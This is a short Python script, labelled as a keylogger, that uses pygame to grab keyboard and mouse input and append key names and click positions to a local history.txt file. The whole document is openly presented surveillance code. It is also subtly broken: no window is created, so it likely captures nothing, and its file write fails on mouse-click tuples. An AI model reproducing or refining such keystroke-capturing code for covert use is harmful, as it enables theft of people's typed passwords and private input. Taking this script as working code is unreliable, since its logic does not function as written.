#keylogger
import pygame
pygame.init()

pygame.event.set_grab(True)
history = []
f = open('.\history.txt', 'a')
try:
    while True:
        for event in pygame.event.get():
            if event.type == pygame.KEYDOWN:
                history.append(pygame.key.name(event.key))
            elif event.type == pygame.MOUSEBUTTONDOWN:
                history.append((pygame.mouse.get_pressed(), pygame.mouse.get_pos()))
        pygame.event.clear()
except:
    pass
finally:
    for item in history:
        f.write(item)
    pygame.event.set_grab(False)
    f.close()
